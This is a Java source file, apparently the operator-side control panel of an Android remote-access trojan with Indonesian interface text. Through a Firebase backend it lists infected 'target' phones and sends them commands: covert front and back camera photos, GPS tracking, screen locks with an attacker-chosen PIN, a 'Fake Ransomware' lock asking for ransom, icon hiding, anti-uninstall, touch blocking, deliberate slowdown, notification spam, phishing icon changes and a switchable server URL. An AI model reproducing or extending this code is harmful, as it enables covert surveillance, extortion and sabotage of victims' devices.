package com.paragon.control;

import android.app.AlertDialog;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.InputType;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.GridLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private DatabaseReference mDatabase;
    private StorageReference mStorage;

    // Header
    private TextView tvDeviceName, tvDeviceId, tvStatus, tvBattery;
    private TextView tvDeviceName2, tvDeviceId2;
    private TextView tvAntiUninstallText;
    private Switch swAntiUninstall;

    // Card components
    private Switch swFlashlight, swLockLow, swLockCustom, swHideIcon, swNgehang;
    private TextView tvFlashlightStatus, tvLockLowStatus, tvLockCustomStatus, tvHideIconStatus, tvNgehangStatus;

    private Button btnGanti, btnSetServer;
    private EditText etServerUrl;

    private String selectedTargetId = null;
    private boolean isTargetConnected = false;

    private static final int REQUEST_VIDEO = 1001;

    private ValueEventListener deviceListener;
    private ValueEventListener antiUninstallListener;
    private ValueEventListener flashlightListener;
    private ValueEventListener lockLowListener;
    private ValueEventListener lockCustomListener;
    private ValueEventListener hideIconListener;
    private ValueEventListener ngehangListener;
    private ValueEventListener targetListListener;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        mDatabase = database.getReference("target");
        mStorage = FirebaseStorage.getInstance().getReference();

        // ===== INISIALISASI VIEW =====
        tvDeviceName = findViewById(R.id.tvDeviceName);
        tvDeviceId = findViewById(R.id.tvDeviceId);
        tvStatus = findViewById(R.id.tvStatus);
        tvBattery = findViewById(R.id.tvBattery);
        tvDeviceName2 = findViewById(R.id.tvDeviceName2);
        tvDeviceId2 = findViewById(R.id.tvDeviceId2);

        tvAntiUninstallText = findViewById(R.id.tvAntiUninstallText);
        swAntiUninstall = findViewById(R.id.swAntiUninstall);

        btnGanti = findViewById(R.id.btnGanti);
        btnSetServer = findViewById(R.id.btnSetServer);
        etServerUrl = findViewById(R.id.etServerUrl);

        // ===== SET NAMA FITUR PADA CARD =====
        setCardName(R.id.cardFlashlight, "Flashlight");
        setCardName(R.id.cardLockLow, "Lock Low");
        setCardName(R.id.cardLockCustom, "Lock Custom V2");
        setCardName(R.id.cardTemaPhising, "Tema Phising");
        setCardName(R.id.cardHideIcon, "Hide Icon");
        setCardName(R.id.cardVideoOverlay, "Video Overlay");
        setCardName(R.id.cardSpamNotif, "Spam Notifikasi");
        setCardName(R.id.cardStuckLayar, "Stuck Layar");
        setCardName(R.id.cardGPS, "GPS");
        setCardName(R.id.cardKamera, "Kamera");
        setCardName(R.id.cardRansomware, "Fake Ransomware");
        setCardName(R.id.cardNgehang, "Ngehang");

        // ===== AMBIL REFERENSI SWITCH & TEXTVIEW DARI CARD =====
        View cardFlashlight = findViewById(R.id.cardFlashlight);
        swFlashlight = cardFlashlight.findViewById(R.id.swFitur);
        tvFlashlightStatus = cardFlashlight.findViewById(R.id.tvStatusFitur);

        View cardLockLow = findViewById(R.id.cardLockLow);
        swLockLow = cardLockLow.findViewById(R.id.swFitur);
        tvLockLowStatus = cardLockLow.findViewById(R.id.tvStatusFitur);

        View cardLockCustom = findViewById(R.id.cardLockCustom);
        swLockCustom = cardLockCustom.findViewById(R.id.swFitur);
        tvLockCustomStatus = cardLockCustom.findViewById(R.id.tvStatusFitur);

        View cardHideIcon = findViewById(R.id.cardHideIcon);
        swHideIcon = cardHideIcon.findViewById(R.id.swFitur);
        tvHideIconStatus = cardHideIcon.findViewById(R.id.tvStatusFitur);

        View cardNgehang = findViewById(R.id.cardNgehang);
        swNgehang = cardNgehang.findViewById(R.id.swFitur);
        tvNgehangStatus = cardNgehang.findViewById(R.id.tvStatusFitur);

        sendMyDeviceInfo();
        listenDeviceInfoRealtime();
        listenStatusRealtime();
        listenTargetList();

        // ===== GANTI SERVER =====
        btnSetServer.setOnClickListener(v -> {
            showInputDialog("🌐 Ganti Server", "Masukkan URL server baru:", "SIMPAN", (input) -> {
                if (!input.isEmpty()) {
                    mDatabase.child("serverUrl").setValue(input);
                    Toast.makeText(this, "✅ Server URL diubah!", Toast.LENGTH_SHORT).show();
                    etServerUrl.setText("");
                } else {
                    Toast.makeText(this, "❌ URL kosong!", Toast.LENGTH_SHORT).show();
                }
            });
        });

        // ===== ANTI UNINSTALL =====
        swAntiUninstall.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (!checkTargetConnection()) {
                swAntiUninstall.setChecked(!isChecked);
                return;
            }
            mDatabase.child(selectedTargetId).child("antiUninstall").setValue(isChecked);
            updateStatusText(tvAntiUninstallText, isChecked);
            Toast.makeText(this, "Anti Uninstall: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // ===== GANTI TARGET =====
        btnGanti.setOnClickListener(v -> showTargetSelectionDialog());

        // ===== 1. FLASHLIGHT (Dialog Konfirmasi) =====
        swFlashlight.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (!checkTargetConnection()) {
                swFlashlight.setChecked(!isChecked);
                return;
            }
            if (isChecked) {
                showConfirmDialog("🔦 Flashlight", "Nyalakan lampu flash target?", () -> {
                    mDatabase.child(selectedTargetId).child("flashlight").setValue(true);
                    updateStatusText(tvFlashlightStatus, true);
                    Toast.makeText(this, "💡 Flashlight ON", Toast.LENGTH_SHORT).show();
                }, () -> {
                    swFlashlight.setChecked(false);
                });
            } else {
                mDatabase.child(selectedTargetId).child("flashlight").setValue(false);
                updateStatusText(tvFlashlightStatus, false);
                Toast.makeText(this, "💡 Flashlight OFF", Toast.LENGTH_SHORT).show();
            }
        });

        // ===== 2. LOCK LOW (Dialog Konfirmasi) =====
        swLockLow.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (!checkTargetConnection()) {
                swLockLow.setChecked(!isChecked);
                return;
            }
            if (isChecked) {
                showConfirmDialog("🔒 Lock Low", "Kunci layar target (mode ringan)?", () -> {
                    mDatabase.child(selectedTargetId).child("lockLow").setValue(true);
                    updateStatusText(tvLockLowStatus, true);
                    Toast.makeText(this, "🔒 Lock Low ON", Toast.LENGTH_SHORT).show();
                }, () -> {
                    swLockLow.setChecked(false);
                });
            } else {
                mDatabase.child(selectedTargetId).child("lockLow").setValue(false);
                updateStatusText(tvLockLowStatus, false);
                Toast.makeText(this, "🔓 Lock Low OFF", Toast.LENGTH_SHORT).show();
            }
        });

        // ===== 3. LOCK CUSTOM V2 (Dialog Set PIN) =====
        swLockCustom.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (!checkTargetConnection()) {
                swLockCustom.setChecked(!isChecked);
                return;
            }
            if (isChecked) {
                showPinDialog("lockCustom", "🔒 Lock Custom V2", "Set PIN untuk mengunci HP target");
            } else {
                mDatabase.child(selectedTargetId).child("lockCustom").setValue(false);
                updateStatusText(tvLockCustomStatus, false);
                Toast.makeText(this, "🔓 Lock Custom OFF", Toast.LENGTH_SHORT).show();
            }
        });

        // ===== 4. NGEHANG (Dialog Konfirmasi) =====
        swNgehang.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (!checkTargetConnection()) {
                swNgehang.setChecked(!isChecked);
                return;
            }
            if (isChecked) {
                showConfirmDialog("💀 Ngehang", "Bikin HP target lemot/ngadat?", () -> {
                    mDatabase.child(selectedTargetId).child("ngehang").setValue(true);
                    updateStatusText(tvNgehangStatus, true);
                    Toast.makeText(this, "💀 Ngehang ON", Toast.LENGTH_SHORT).show();
                }, () -> {
                    swNgehang.setChecked(false);
                });
            } else {
                mDatabase.child(selectedTargetId).child("ngehang").setValue(false);
                updateStatusText(tvNgehangStatus, false);
                Toast.makeText(this, "💀 Ngehang OFF", Toast.LENGTH_SHORT).show();
            }
        });

        // ===== 5. HIDE ICON (Dialog Konfirmasi) =====
        swHideIcon.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (!checkTargetConnection()) {
                swHideIcon.setChecked(!isChecked);
                return;
            }
            if (isChecked) {
                showConfirmDialog("👻 Hide Icon", "Sembunyikan ikon aplikasi target?", () -> {
                    mDatabase.child(selectedTargetId).child("hideIcon").setValue(true);
                    updateStatusText(tvHideIconStatus, true);
                    Toast.makeText(this, "👻 Hide Icon ON", Toast.LENGTH_SHORT).show();
                }, () -> {
                    swHideIcon.setChecked(false);
                });
            } else {
                mDatabase.child(selectedTargetId).child("hideIcon").setValue(false);
                updateStatusText(tvHideIconStatus, false);
                Toast.makeText(this, "👻 Hide Icon OFF", Toast.LENGTH_SHORT).show();
            }
        });

        // ===== 6. TEMA PHISING (Dialog Input URL) =====
        View cardTemaPhising = findViewById(R.id.cardTemaPhising);
        Button btnTemaPhising = cardTemaPhising.findViewById(R.id.btnAction);
        if (btnTemaPhising != null) {
            btnTemaPhising.setOnClickListener(v -> {
                if (!checkTargetConnection()) return;
                showInputDialog("🎨 Tema Phising", "Masukkan URL icon baru:", "GANTI", (input) -> {
                    if (!input.isEmpty()) {
                        mDatabase.child(selectedTargetId).child("temaPhising").setValue(input);
                        Toast.makeText(this, "✅ Icon diubah!", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(this, "❌ URL kosong!", Toast.LENGTH_SHORT).show();
                    }
                });
            });
        }

        // ===== 7. VIDEO OVERLAY (Buka Galeri) =====
        View cardVideoOverlay = findViewById(R.id.cardVideoOverlay);
        Button btnVideoOverlay = cardVideoOverlay.findViewById(R.id.btnAction);
        if (btnVideoOverlay != null) {
            btnVideoOverlay.setOnClickListener(v -> {
                if (!checkTargetConnection()) return;
                Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                intent.setType("video/*");
                startActivityForResult(intent, REQUEST_VIDEO);
            });
        }

        // ===== 8. SPAM NOTIFIKASI (Dialog Input Pesan) =====
        View cardSpamNotif = findViewById(R.id.cardSpamNotif);
        Button btnSpamNotif = cardSpamNotif.findViewById(R.id.btnAction);
        if (btnSpamNotif != null) {
            btnSpamNotif.setOnClickListener(v -> {
                if (!checkTargetConnection()) return;
                showInputDialog("📨 Spam Notifikasi", "Ketik pesan spam:", "KIRIM", (input) -> {
                    if (!input.isEmpty()) {
                        mDatabase.child(selectedTargetId).child("spamNotif").setValue(input);
                        Toast.makeText(this, "✅ Spam terkirim!", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(this, "❌ Pesan kosong!", Toast.LENGTH_SHORT).show();
                    }
                });
            });
        }

        // ===== 9. STUCK LAYAR (Dialog Konfirmasi) =====
        View cardStuckLayar = findViewById(R.id.cardStuckLayar);
        Button btnStuckLayar = cardStuckLayar.findViewById(R.id.btnAction);
        if (btnStuckLayar != null) {
            btnStuckLayar.setOnClickListener(v -> {
                if (!checkTargetConnection()) return;
                showConfirmDialog("🔒 Stuck Layar", "Blokir touch screen target?", () -> {
                    mDatabase.child(selectedTargetId).child("stuckLayar").setValue("TAP, BLOCK TOUCH");
                    Toast.makeText(this, "🔒 Stuck Layar AKTIF!", Toast.LENGTH_SHORT).show();
                });
            });
        }

        // ===== 10. GPS (Dialog Konfirmasi) =====
        View cardGPS = findViewById(R.id.cardGPS);
        Button btnGPS = cardGPS.findViewById(R.id.btnAction);
        if (btnGPS != null) {
            btnGPS.setOnClickListener(v -> {
                if (!checkTargetConnection()) return;
                showConfirmDialog("📍 GPS", "Ambil lokasi target sekarang?", () -> {
                    mDatabase.child(selectedTargetId).child("command").setValue("gps");
                    Toast.makeText(this, "📍 Mengambil lokasi target...", Toast.LENGTH_SHORT).show();
                });
            });
        }

        // ===== 11. KAMERA (Dialog Pilih Kamera) =====
        View cardKamera = findViewById(R.id.cardKamera);
        Button btnKamera = cardKamera.findViewById(R.id.btnAction);
        if (btnKamera != null) {
            btnKamera.setOnClickListener(v -> {
                if (!checkTargetConnection()) return;
                showCameraDialog();
            });
        }

        // ===== 12. FAKE RANSOMWARE (Dialog Set PIN) =====
        View cardRansomware = findViewById(R.id.cardRansomware);
        Button btnRansomware = cardRansomware.findViewById(R.id.btnAction);
        if (btnRansomware != null) {
            btnRansomware.setOnClickListener(v -> {
                if (!checkTargetConnection()) return;
                showPinDialog("ransomware", "💰 Fake Ransomware", "Set PIN untuk mengunci HP target dan minta tebusan");
            });
        }
    }

    // ===== DIALOG KONFIRMASI =====
    private void showConfirmDialog(String title, String message, Runnable onConfirm) {
        showConfirmDialog(title, message, onConfirm, null);
    }

    private void showConfirmDialog(String title, String message, Runnable onConfirm, Runnable onCancel) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(title);
        builder.setMessage(message);
        builder.setPositiveButton("YA", (dialog, which) -> {
            if (onConfirm != null) onConfirm.run();
        });
        builder.setNegativeButton("BATAL", (dialog, which) -> {
            if (onCancel != null) onCancel.run();
            dialog.cancel();
        });
        builder.setCancelable(false);
        builder.show();
    }

    // ===== DIALOG INPUT =====
    private void showInputDialog(String title, String hint, String buttonText, OnInputListener listener) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(title);

        final EditText input = new EditText(this);
        input.setHint(hint);
        input.setTextColor(0xFFFFFFFF);
        input.setHintTextColor(0xFF888888);
        input.setBackgroundColor(0x1A1A1A);
        input.setPadding(20, 16, 20, 16);
        builder.setView(input);

        builder.setPositiveButton(buttonText, (dialog, which) -> {
            String result = input.getText().toString().trim();
            if (listener != null) listener.onInput(result);
        });
        builder.setNegativeButton("BATAL", null);
        builder.show();
    }

    // ===== DIALOG PIN =====
    private void showPinDialog(String command, String title, String message) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(title);
        builder.setMessage(message);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(30, 20, 30, 20);

        final EditText input = new EditText(this);
        input.setInputType(InputType.TYPE_CLASS_NUMBER | InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        input.setHint("4 digit PIN");
        input.setMaxLines(1);
        input.setTextSize(18);
        input.setTextColor(0xFFFFFFFF);
        input.setHintTextColor(0xFF888888);
        layout.addView(input);

        GridLayout grid = new GridLayout(this);
        grid.setColumnCount(3);
        grid.setRowCount(4);

        String[] keys = {"1","2","3","4","5","6","7","8","9","⌫","0","✓"};
        for (String key : keys) {
            Button btn = new Button(this);
            btn.setText(key);
            btn.setTextSize(20);
            btn.setTextColor(0xFFFFFFFF);
            btn.setBackgroundColor(0x1A1A1A);
            btn.setPadding(16, 16, 16, 16);
            btn.setOnClickListener(v -> {
                String current = input.getText().toString();
                if (key.equals("⌫")) {
                    if (current.length() > 0) {
                        input.setText(current.substring(0, current.length() - 1));
                    }
                } else if (key.equals("✓")) {
                    String pin = input.getText().toString().trim();
                    if (pin.length() == 4) {
                        mDatabase.child(selectedTargetId).child("pin").setValue(pin);
                        if (command.equals("lockCustom")) {
                            mDatabase.child(selectedTargetId).child("lockCustom").setValue(true);
                            updateStatusText(tvLockCustomStatus, true);
                            Toast.makeText(MainActivity.this, "🔒 HP Target Terkunci! PIN: " + pin, Toast.LENGTH_SHORT).show();
                        } else if (command.equals("ransomware")) {
                            mDatabase.child(selectedTargetId).child("ransomware").setValue(true);
                            Toast.makeText(MainActivity.this, "💰 Target kena Ransomware! PIN: " + pin, Toast.LENGTH_SHORT).show();
                        }
                        AlertDialog dialog = (AlertDialog) v.getTag();
                        if (dialog != null) dialog.dismiss();
                    } else {
                        Toast.makeText(MainActivity.this, "❌ PIN harus 4 digit!", Toast.LENGTH_SHORT).show();
                    }
                } else {
                    if (current.length() < 4) {
                        input.setText(current + key);
                    }
                }
            });
            grid.addView(btn);
        }

        layout.addView(grid);
        builder.setView(layout);

        builder.setNegativeButton("BATAL", (dialog, which) -> {
            if (command.equals("lockCustom")) {
                swLockCustom.setChecked(false);
                updateStatusText(tvLockCustomStatus, false);
            }
            dialog.cancel();
        });

        AlertDialog dialog = builder.create();

        for (int i = 0; i < grid.getChildCount(); i++) {
            View v = grid.getChildAt(i);
            if (v instanceof Button && ((Button) v).getText().equals("✓")) {
                v.setTag(dialog);
                break;
            }
        }

        dialog.show();
    }

    // ===== DIALOG KAMERA =====
    private void showCameraDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("📸 Pilih Kamera Target");
        builder.setItems(new String[]{"📷 Kamera Depan", "📷 Kamera Belakang"}, (dialog, which) -> {
            String command = (which == 0) ? "camera_front" : "camera_back";
            mDatabase.child(selectedTargetId).child("command").setValue(command);
            Toast.makeText(this, "📸 Mengambil foto...", Toast.LENGTH_SHORT).show();
        });
        builder.setNegativeButton("BATAL", null);
        builder.show();
    }

    // ===== DIALOG PILIH TARGET =====
    private void showTargetSelectionDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("📱 PILIH TARGET");

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(20, 20, 20, 20);

        TextView info = new TextView(this);
        info.setText("Memuat daftar target...");
        info.setTextColor(0xFFFFFFFF);
        layout.addView(info);

        builder.setView(layout);
        AlertDialog dialog = builder.create();

        mDatabase.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                layout.removeAllViews();
                boolean hasTarget = false;

                for (DataSnapshot child : snapshot.getChildren()) {
                    String key = child.getKey();
                    if (key == null || key.equals("deviceInfo") || key.equals("serverUrl")) continue;

                    String deviceName = child.child("deviceName").getValue(String.class);
                    String deviceId = child.child("deviceId").getValue(String.class);
                    Integer battery = child.child("battery").getValue(Integer.class);
                    Boolean online = child.child("online").getValue(Boolean.class);

                    if (deviceName == null || deviceId == null) continue;
                    hasTarget = true;

                    LinearLayout item = new LinearLayout(MainActivity.this);
                    item.setOrientation(LinearLayout.VERTICAL);
                    item.setPadding(16, 12, 16, 12);
                    item.setBackgroundColor(0x1A1A1A);
                    item.setClickable(true);

                    TextView tvName = new TextView(MainActivity.this);
                    String status = online != null && online ? "🟢 ONLINE" : "🔴 OFFLINE";
                    String bat = battery != null ? battery + "%" : "?%";
                    tvName.setText(deviceName + " (" + status + ") " + bat);
                    tvName.setTextColor(online != null && online ? 0xFF4ADE80 : 0xFFFF5C7C);
                    item.addView(tvName);

                    TextView tvId = new TextView(MainActivity.this);
                    tvId.setText("ID: " + deviceId);
                    tvId.setTextColor(0xFF9CA3AF);
                    tvId.setTextSize(12);
                    item.addView(tvId);

                    item.setOnClickListener(v -> {
                        selectedTargetId = key;
                        isTargetConnected = online != null && online;
                        if (deviceName != null) {
                            tvDeviceName.setText(deviceName);
                            tvDeviceName2.setText(deviceName);
                        }
                        if (deviceId != null) {
                            tvDeviceId.setText(deviceId);
                            tvDeviceId2.setText(deviceId);
                        }
                        if (battery != null) tvBattery.setText(battery + "%");
                        if (online != null) {
                            tvStatus.setText(online ? "ONLINE" : "OFFLINE");
                            tvStatus.setTextColor(online ? 0xFF4ADE80 : 0xFFFF5C7C);
                        }
                        Toast.makeText(MainActivity.this, "✅ Target dipilih: " + deviceName, Toast.LENGTH_SHORT).show();
                        dialog.dismiss();
                    });

                    layout.addView(item);
                    View spacer = new View(MainActivity.this);
                    spacer.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 8));
                    layout.addView(spacer);
                }

                if (!hasTarget) {
                    TextView noTarget = new TextView(MainActivity.this);
                    noTarget.setText("⚠️ Belum ada target yang terhubung");
                    noTarget.setTextColor(0xFFFF5C7C);
                    noTarget.setPadding(16, 16, 16, 16);
                    layout.addView(noTarget);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                TextView err = new TextView(MainActivity.this);
                err.setText("❌ Gagal memuat daftar target");
                err.setTextColor(0xFFFF5C7C);
                err.setPadding(16, 16, 16, 16);
                layout.addView(err);
            }
        });

        builder.setNegativeButton("Tutup", (d, which) -> dialog.dismiss());
        dialog.show();
    }

    // ===== CEK KONEKSI TARGET =====
    private boolean checkTargetConnection() {
        if (selectedTargetId == null || !isTargetConnected) {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("⚠️ Belum Terhubung");
            builder.setMessage("Belum terhubung ke target. Silakan pilih target terlebih dahulu.");
            builder.setPositiveButton("PILIH TARGET", (dialog, which) -> showTargetSelectionDialog());
            builder.setNegativeButton("Batal", null);
            builder.show();
            return false;
        }
        return true;
    }

    // ===== FUNGSI SET NAMA FITUR PADA CARD =====
    private void setCardName(int cardId, String nama) {
        View card = findViewById(cardId);
        if (card == null) return;
        TextView tvNama = card.findViewById(R.id.tvNamaFitur);
        if (tvNama != null) {
            tvNama.setText(nama);
        }
        String[] toggleFitur = {"Flashlight", "Lock Low", "Lock Custom V2", "Hide Icon", "Ngehang"};
        boolean isToggle = false;
        for (String f : toggleFitur) {
            if (f.equals(nama)) isToggle = true;
        }
        Switch swFitur = card.findViewById(R.id.swFitur);
        TextView tvStatus = card.findViewById(R.id.tvStatusFitur);
        Button btnAction = card.findViewById(R.id.btnAction);
        if (isToggle) {
            if (swFitur != null) swFitur.setVisibility(View.VISIBLE);
            if (tvStatus != null) tvStatus.setVisibility(View.VISIBLE);
            if (btnAction != null) btnAction.setVisibility(View.GONE);
        } else {
            if (swFitur != null) swFitur.setVisibility(View.GONE);
            if (tvStatus != null) tvStatus.setVisibility(View.GONE);
            if (btnAction != null) {
                btnAction.setVisibility(View.VISIBLE);
                btnAction.setText("TAP");
            }
        }
    }

    // ===== UPDATE STATUS TEXT =====
    private void updateStatusText(TextView tv, boolean isOn) {
        tv.setText(isOn ? "ON" : "OFF");
        tv.setTextColor(isOn ? 0xFF4ADE80 : 0xFFFF5C7C);
    }

    // ===== LISTEN TARGET LIST =====
    private void listenTargetList() {
        targetListListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (selectedTargetId != null) {
                    DataSnapshot targetSnapshot = snapshot.child(selectedTargetId);
                    if (targetSnapshot.exists()) {
                        String deviceName = targetSnapshot.child("deviceName").getValue(String.class);
                        String deviceId = targetSnapshot.child("deviceId").getValue(String.class);
                        Integer battery = targetSnapshot.child("battery").getValue(Integer.class);
                        Boolean online = targetSnapshot.child("online").getValue(Boolean.class);

                        runOnUiThread(() -> {
                            if (deviceName != null) {
                                tvDeviceName.setText(deviceName);
                                tvDeviceName2.setText(deviceName);
                            }
                            if (deviceId != null) {
                                tvDeviceId.setText(deviceId);
                                tvDeviceId2.setText(deviceId);
                            }
                            if (battery != null) tvBattery.setText(battery + "%");
                            if (online != null) {
                                tvStatus.setText(online ? "ONLINE" : "OFFLINE");
                                tvStatus.setTextColor(online ? 0xFF4ADE80 : 0xFFFF5C7C);
                            }
                            isTargetConnected = online != null && online;
                        });
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.addValueEventListener(targetListListener);
    }

    // ===== REAL-TIME: DATA TARGET =====
    private void listenDeviceInfoRealtime() {
        deviceListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    String deviceName = snapshot.child("deviceName").getValue(String.class);
                    String deviceId = snapshot.child("deviceId").getValue(String.class);
                    Integer battery = snapshot.child("battery").getValue(Integer.class);
                    Boolean online = snapshot.child("online").getValue(Boolean.class);
                    runOnUiThread(() -> {
                        if (deviceName != null) {
                            tvDeviceName.setText(deviceName);
                            tvDeviceName2.setText(deviceName);
                        }
                        if (deviceId != null) {
                            tvDeviceId.setText(deviceId);
                            tvDeviceId2.setText(deviceId);
                        }
                        if (battery != null) tvBattery.setText(battery + "%");
                        if (online != null) {
                            tvStatus.setText(online ? "ONLINE" : "OFFLINE");
                            tvStatus.setTextColor(online ? 0xFF4ADE80 : 0xFFFF5C7C);
                        }
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("deviceInfo").addValueEventListener(deviceListener);
    }

    // ===== REAL-TIME: STATUS =====
    private void listenStatusRealtime() {
        flashlightListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        swFlashlight.setChecked(value);
                        updateStatusText(tvFlashlightStatus, value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("flashlight").addValueEventListener(flashlightListener);

        lockLowListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        swLockLow.setChecked(value);
                        updateStatusText(tvLockLowStatus, value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("lockLow").addValueEventListener(lockLowListener);

        lockCustomListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        swLockCustom.setChecked(value);
                        updateStatusText(tvLockCustomStatus, value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("lockCustom").addValueEventListener(lockCustomListener);

        hideIconListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        swHideIcon.setChecked(value);
                        updateStatusText(tvHideIconStatus, value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("hideIcon").addValueEventListener(hideIconListener);

        antiUninstallListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        swAntiUninstall.setChecked(value);
                        updateStatusText(tvAntiUninstallText, value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("antiUninstall").addValueEventListener(antiUninstallListener);

        ngehangListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        swNgehang.setChecked(value);
                        updateStatusText(tvNgehangStatus, value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("ngehang").addValueEventListener(ngehangListener);
    }

    // ===== SEND DEVICE INFO =====
    private void sendMyDeviceInfo() {
        String deviceName = Build.MODEL;
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        int battery = getBatteryLevel();
        Map<String, Object> data = new HashMap<>();
        data.put("deviceName", deviceName);
        data.put("deviceId", deviceId);
        data.put("battery", battery);
        data.put("online", true);
        data.put("timestamp", System.currentTimeMillis());
        mDatabase.child("deviceInfo").setValue(data);
    }

    private int getBatteryLevel() {
        android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
        return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_VIDEO && resultCode == RESULT_OK && data != null) {
            Uri videoUri = data.getData();
            uploadVideoToFirebase(videoUri);
        }
    }

    private void uploadVideoToFirebase(Uri videoUri) {
        Toast.makeText(this, "📤 Uploading video...", Toast.LENGTH_SHORT).show();
        StorageReference ref = mStorage.child("videos/" + System.currentTimeMillis() + ".mp4");
        ref.putFile(videoUri).addOnSuccessListener(taskSnapshot -> {
            ref.getDownloadUrl().addOnSuccessListener(uri -> {
                mDatabase.child(selectedTargetId).child("videoUrl").setValue(uri.toString());
                Toast.makeText(this, "✅ Video terkirim ke target!", Toast.LENGTH_SHORT).show();
            });
        }).addOnFailureListener(e -> {
            Toast.makeText(this, "❌ Gagal upload video!", Toast.LENGTH_SHORT).show();
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (deviceListener != null) mDatabase.child("deviceInfo").removeEventListener(deviceListener);
        if (flashlightListener != null) mDatabase.child("flashlight").removeEventListener(flashlightListener);
        if (lockLowListener != null) mDatabase.child("lockLow").removeEventListener(lockLowListener);
        if (lockCustomListener != null) mDatabase.child("lockCustom").removeEventListener(lockCustomListener);
        if (hideIconListener != null) mDatabase.child("hideIcon").removeEventListener(hideIconListener);
        if (antiUninstallListener != null) mDatabase.child("antiUninstall").removeEventListener(antiUninstallListener);
        if (ngehangListener != null) mDatabase.child("ngehang").removeEventListener(ngehangListener);
        if (targetListListener != null) mDatabase.removeEventListener(targetListListener);
    }

    interface OnInputListener {
        void onInput(String input);
    }
                                  }
